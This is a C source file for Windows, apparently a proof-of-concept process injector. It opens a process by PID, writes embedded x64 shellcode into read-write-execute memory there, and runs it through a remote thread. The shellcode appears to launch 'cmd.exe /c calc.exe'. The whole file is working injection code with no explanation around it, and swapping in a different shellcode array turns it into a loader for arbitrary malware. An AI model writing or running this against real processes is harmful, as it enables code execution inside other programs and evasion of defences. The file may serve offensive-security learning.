#include <Windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {


	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61"
		"\x6c\x63\x2e\x65\x78\x65\x00";

	if (argc < 2) {
		printf("[-] usage: %s <PID>\n", argv[0]);
	}

	DWORD PID = atoi(argv[1]);
	DWORD TID = NULL;

	printf("[*] try to get a handle to the process (%ld)\n", PID);

	HANDLE hProcess = OpenProcess(
		/*  DWORD dwDesiredAccess */ PROCESS_ALL_ACCESS,
		/*  BOOL  bInheritHandle  */ false,
		/*  DWORD dwProcessId     */ PID
	);

	if (hProcess == nullptr) {
		printf("[-] failed to get a handle to the process,error: 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] got a handle to the process\n\\---0x%p\n", hProcess);

	PVOID Buffer = VirtualAllocEx(
		/* HANDLE hProcess         */ hProcess,
		/* LPVOID lpAddress        */ nullptr,
		/* SIZE_T dwSize           */ sizeof(shellcode),
		/* DWORD  flAllocationType */ (MEM_RESERVE | MEM_COMMIT),
		/* DWORD  flProtect        */ PAGE_EXECUTE_READWRITE
	);
	printf("[+] allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", sizeof(shellcode));

	WriteProcessMemory(
		/* HANDLE  hProcess                */ hProcess,
		/* LPVOID  lpBaseAddress           */ Buffer,
		/* LPCVOID lpBuffer                */ shellcode,
		/* SIZE_T  nSize                   */ sizeof(shellcode),
		/* SIZE_T  *lpNumberOfBytesWritten */ nullptr
	);
	printf("[+] wrote shellcode to allocated buffer\n");

	HANDLE hThread = CreateRemoteThreadEx(
		/* HANDLE                       hProcess           */ hProcess,
		/* LPSECURITY_ATTRIBUTES        lpThreadAttributes */ nullptr,
		/* SIZE_T                       dwStackSize        */ 0,
		/* LPTHREAD_START_ROUTINE       lpStartAddress     */ (LPTHREAD_START_ROUTINE)Buffer,
		/* LPVOID                       lpParameter        */ nullptr,
		/* DWORD                        dwCreationFlags    */ 0,
		/* LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList    */ 0,
		/* LPDWORD                      lpThreadId         */ &TID
	);

	if (hThread == NULL) {
		printf("[-] failed to get a handle to the new thread, error: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] got a handle to the newly-created thread (%ld)\n\\---0x%p\n", TID, hProcess);

	printf("[*] waiting for thread to finish executing\n");
	WaitForSingleObject(hThread, INFINITE);
	printf("[+] thread finished executing, cleaning up\n");

	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("[+] finished, see you next time :>");

	return EXIT_SUCCESS;
}